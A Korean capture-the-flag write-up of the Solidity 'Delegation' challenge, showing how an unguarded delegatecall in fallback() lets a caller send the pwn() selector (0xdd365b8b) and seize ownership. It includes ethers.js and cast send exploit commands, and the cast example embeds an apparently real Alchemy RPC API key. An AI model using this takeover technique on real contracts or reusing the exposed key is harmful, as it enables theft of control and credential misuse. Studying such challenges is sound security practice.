# Delegation 컨트랙트 취약점 분석 및 Exploit Writeup

## 개요

이 문서는 `Delegate` / `Delegation` 문제의 취약점 원리와 익스플로잇(ownership 획득) 절차를 정리한 writeup입니다. 실제로 수행한 방법, 사용한 명령어(cast / ethers 등), 발생한 문제(트랜잭션 성공했으나 풀리지 않음) 및 점검해야 할 항목들을 포함합니다.

---

## 대상 소스 코드

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Delegate {
    address public owner;

    constructor(address _owner) {
        owner = _owner;
    }

    function pwn() public {
        owner = msg.sender;
    }
}

contract Delegation {
    address public owner;
    Delegate delegate;

    constructor(address _delegateAddress) {
        delegate = Delegate(_delegateAddress);
        owner = msg.sender;
    }

    fallback() external {
        (bool result,) = address(delegate).delegatecall(msg.data);
        if (result) {
            this;
        }
    }
}
```

---

## 취약점 요약

* 핵심: `Delegation`의 `fallback()`이 `delegate.call`을 사용해 `Delegate`의 코드를 `Delegation` 컨텍스트로 실행한다. 이는 `msg.sender`와 `storage`가 `Delegation` 컨트랙트에 영향을 미치도록 만든다.
* 결과: `Delegate`의 `pwn()`을 `delegatecall`을 통해 실행하면 `Delegation`의 `owner`가 호출자(`msg.sender`)로 변경된다. 즉, `Delegation`의 소유권을 탈취할 수 있음.

---

## 익스플로잇 원리 (한 문장)

`Delegation` 인스턴스에 `pwn()` 함수의 function selector를 calldata로 보내면 `fallback()`이 호출되어 `delegatecall`이 실행되고, `Delegate`의 `pwn()`가 `Delegation`의 storage를 변경하여 owner를 탈취한다.

---

## 익스플로잇 절차

1. `pwn()` 함수의 function selector(4바이트)를 구한다. 예: `keccak256("pwn()")` → 첫 4바이트 → `0xdd365b8b`.
2. `Delegation` 컨트랙트 주소(문제 인스턴스)에 트랜잭션을 보낼 때 `data`에 해당 selector를 넣어 보낸다.

   * 예: `await contract.sendTransaction({ data: "0xdd365b8b" })` (ethers.js 콘솔 예시)
3. `Delegation`의 `fallback()`이 실행되어 `delegatecall`이 발생하고, `Delegate`의 `pwn()`가 `Delegation`의 `owner`를 호출자로 바꾼다.
4. 이후 `Delegation.owner()`를 조회해 소유권이 바뀌었는지 확인한다.

---

## 사용한 커맨드 예시

* ethers.js (console)

```js
await contract.sendTransaction({ data: "0xdd365b8b" })
```

* foundry `cast` 예시 (시도한 명령)

```bash
cast send 0x6488FC06bd82a2B7aE8bA3a2868F8B01606DF09b \
  --rpc-url https://eth-sepolia.g.alchemy.com/v2/JRwGoQDFFeWbOe5_V5Ryk0XKPdavMRUA \
  --private-key $PRIVATE_KEY 0xdd365b8b
```

---

## 트랜잭션이 성공했지만 문제(풀이 미완료)가 발생했을 때 점검할 항목

1. **대상 주소 확인**

   * `Delegation` 컨트랙트 주소로 전송했는지, 실수로 `Delegate` 주소로 보냈는지 확인합니다. (정답: `Delegation` 주소로 보내야 함)
2. **calldata 문법**

   * `cast send` 사용 시 `data` 인자로 전달하는 형식이 올바른지 확인합니다. 일부 CLI는 `--data` 또는 `--calldata` 같은 옵션이나, 값을 따옴표로 감싸지 않으면 문제가 발생할 수 있습니다.
   * `cast send <to> 0x... --value 0 --data 0xdd365b8b` 등 형태로 시도해보세요.
3. **가스 관련 문제**

   * `gas-limit`가 너무 낮아 delegatecall이 실행되기 전에 revert될 수 있습니다. 충분한 가스(예: 100k 이상)를 지정하여 재시도해 보세요.
4. **네트워크 지연/포크 환경**

   * 테스트넷(RPC) 문제일 가능성 — RPC가 미묘하게 동작하지 않거나 트랜잭션이 실제로 다른 체인/포크에서 처리되었을 수 있음. 트랜잭션 해시로 Etherscan(또는 해당 네트워크 탐색기)을 확인하세요.
5. **트랜잭션 수신/출력 확인**

   * 트랜잭션 로그, 리턴 값, 영수증의 `status`(1이면 성공), `to`와 `from` 필드가 정확한지 확인.

---

## 추가 팁

* `cast send` 명령으로 실패할 경우 `eth_sendRawTransaction` 방식(직접 서명 후 전송) 또는 ethers.js로 동일한 payload를 보내 확인하면 원인 파악에 도움이 됩니다.
* `hardhat`/`foundry` 로컬 포크에서 시연하면 빠르게 반복 테스트 가능.

---

## 결론

* 문제의 핵심은 `Delegation`의 `fallback()`에서 `delegatecall`을 통해 외부 코드(`Delegate`)를 `Delegation`의 컨텍스트로 실행하는 점임.
* calldata에 `pwn()` selector를 넣어 `Delegation`에 전송하면 `owner`를 탈취할 수 있으며, 이를 통해 소유권을 획득하는 것이 이 문제의 목적이다.

---

## 부록: selector 계산

* `pwn()` selector 계산 예시 (JavaScript):

```js
const selector = ethers.utils.id("pwn()").slice(0,10); // "0xdd365b8b"
```

<!-- 작성자: 유저 제공 내용을 기반으로 편집됨 -->
